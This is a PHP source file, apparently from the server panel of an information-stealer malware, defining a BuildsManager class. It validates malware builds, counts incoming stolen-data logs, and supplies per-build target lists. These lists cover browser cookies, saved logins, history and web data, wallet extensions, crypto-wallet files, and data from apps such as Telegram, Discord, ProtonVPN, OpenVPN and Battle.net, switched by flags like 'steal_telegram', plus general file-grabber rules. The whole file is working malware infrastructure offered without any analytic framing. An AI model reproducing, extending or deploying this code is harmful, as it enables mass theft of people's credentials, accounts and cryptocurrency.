<?php

class BuildsManager
{
    // ---------------------------------------------------------------------------------------
    // mysqli
    private $connection;
    private $build;

    // ---------------------------------------------------------------------------------------
    // __construct
    //
    // class constructor
    // ---------------------------------------------------------------------------------------
    public function __construct($connection)
    {
        $this->connection = $connection;
    }

    // ---------------------------------------------------------------------------------------
    // CheckBuild
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function CheckBuild($build)
    {
        $request = "SELECT * FROM `builds` WHERE `name` = ? AND active = 1";
	
        if ($stmt = $this->connection->prepare($request)) 
        {
            $stmt->bind_param("s", $build);
            
            $stmt->execute();
            $result = $stmt->get_result();
            $record = $result->fetch_assoc();
            $stmt->close();
            
            if ($record != null)
            {
                $this->build = new Build($record);
                return $this->build;
            }
        }
        
        return false;
    }

    // ---------------------------------------------------------------------------------------
    // UpdateLogsCountByBuild
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function UpdateLogsCount($name)
    {
        $query = "UPDATE `builds` SET `logs_count` = `logs_count`+1 WHERE `name` = ?";
        
        if ($stmt = $this->connection->prepare($query)) 
        {
            $stmt->bind_param('s', $name);
            $stmt->execute();
        }
    }

    // ---------------------------------------------------------------------------------------
    // getBrowsers
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function getBrowsers()
    {
        $browsers = [];

        $query = "SELECT `name`, `path`, `type`, `soft_path`, `use_v20`, `parse_cookies`, `parse_logins`, `parse_history`, `parse_webdata` FROM `browsers` WHERE `active`=1;";

        if ($result = $this->connection->query($query))
        {
            while ($row = $result->fetch_assoc())
            {
                if(!$this->build->steal_discord && $row["name"] == "Discord")
                {
                    continue;
                }

                if(!$this->build->steal_thunderbird && $row["name"] == "Thunderbird")
                {
                    continue;
                }

                $browser = new Browser($row);
                $browsers[] = $browser;
            }
            $result->free();
        }

        return $browsers;
    }

    // ---------------------------------------------------------------------------------------
    // getPlugins
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function getPlugins()
    {
        $plugins = [];

        $query = "SELECT `name`, `token`, `from_local`, `from_sync`, `from_IndexedDB` FROM `plugins` WHERE `active`=1;";

        if ($result = $this->connection->query($query))
        {
            while ($row = $result->fetch_assoc())
            {
                $plugin = new Plugin($row);
                $plugins[] = $plugin;
            }
            $result->free();
        }

        return $plugins;
    }

    // ---------------------------------------------------------------------------------------
    // getWallets
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function getWallets()
    {
        $wallets = [];

        $query = "SELECT `name`, `type`, `csidl`, `start_path`, `masks`, `recursive`, `max_size`, `iterations` FROM `wallets` WHERE `active`=1;";

        if ($result = $this->connection->query($query))
        {
            while ($row = $result->fetch_assoc())
            {
                $wallet = new FileRule($row);
                $wallets[] = $wallet;
            }
            $result->free();
        }

        return $wallets;
    }

    // ---------------------------------------------------------------------------------------
    // getPrograms
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function getPrograms()
    {
        $programs = [];

        $query = "SELECT `name`, `type`, `csidl`, `start_path`, `masks`, `recursive`, `max_size`, `iterations` FROM `programs` WHERE `active`=1;";

        if ($result = $this->connection->query($query))
        {
            while ($row = $result->fetch_assoc())
            {
                if(!$this->build->steal_battlenet && $row["name"] == "Battle.Net")
                {
                    continue;
                }

                if(!$this->build->steal_uplay && $row["name"] == "Uplay")
                {
                    continue;
                }

                if(!$this->build->steal_protonvpn && $row["name"] == "ProtonVPN")
                {
                    continue;
                }

                if(!$this->build->steal_openvpn && $row["name"] == "OpenVPN")
                {
                    continue;
                }

                if(!$this->build->steal_telegram && $row["name"] == "Telegram")
                {
                    continue;
                }

                if(!$this->build->steal_tox && $row["name"] == "Tox")
                {
                    continue;
                }

                if(!$this->build->steal_pidgin && $row["name"] == "Pidgin")
                {
                    continue;
                }

                if(!$this->build->steal_discord && $row["name"] == "Discord")
                {
                    continue;
                }

                $program = new FileRule($row);
                $programs[] = $program;
            }
            $result->free();
        }

        return $programs;
    }

    // ---------------------------------------------------------------------------------------
    // getGrabberRules
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function getGrabberRules()
    {
        $rules = [];

        $query = "SELECT `name`, `type`, `csidl`, `start_path`, `masks`, `recursive`, `max_size`, `iterations` FROM `grabber` WHERE `active`=1;";

        if ($result = $this->connection->query($query))
        {
            while ($row = $result->fetch_assoc())
            {
                $rule = new FileRule($row);
                $rules[] = $rule;
            }
            $result->free();
        }

        return $rules;
    }
}

?>